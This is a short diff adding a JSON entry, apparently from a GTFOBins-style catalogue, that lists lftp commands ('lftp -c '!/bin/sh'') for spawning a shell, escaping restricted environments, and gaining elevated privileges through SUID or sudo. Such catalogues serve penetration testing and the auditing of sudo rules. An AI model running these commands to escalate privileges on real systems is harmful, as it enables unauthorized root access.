@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "lftp -c '!/bin/sh'\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        
+        "code": "./lftp -c '!/bin/sh'\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo lftp -c '!/bin/sh'\n"
+      }
+    ]
+  }
+}
